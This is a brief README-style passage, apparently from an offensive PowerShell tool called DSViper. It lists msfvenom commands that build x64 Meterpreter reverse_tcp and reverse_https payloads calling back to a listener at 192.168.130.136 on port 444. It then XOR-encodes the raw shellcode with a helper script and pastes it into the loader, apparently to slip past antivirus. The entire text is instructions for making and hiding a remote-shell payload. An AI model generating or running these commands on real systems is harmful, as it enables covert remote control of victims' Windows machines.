# ✔️ **only x64 payloads work**
>example payloads are
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.130.136 LPORT=444 -f raw > payload2.bin #recommended
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.130.136 LPORT=444 -f raw > payload2.bin
python3 xorenc.py payload2.bin #copy paste the key and payload in the DSViper.ps1 file
```
